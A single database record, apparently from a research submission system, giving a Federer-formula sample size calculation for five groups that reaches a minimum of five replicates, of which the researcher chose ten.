	(10209,283,'sample_size_calculation_details','\"The sample is calculated using the Federer formula: (n-1)(t-1)&gt;15, where n = number of repetitions or replications, t = number of groupings. (n-1) (5-1)&gt;15; 5n -n -5 +1 &gt; 15; 4n -4&gt;15; 4n&gt; 19; n&gt; 4,75 or 5. The minimum number of samples is 5, the researcher chose ten in order to minimize bias and become a proposal for further research.\"','2022-03-31 13:24:06','2022-03-31 13:24:07'),
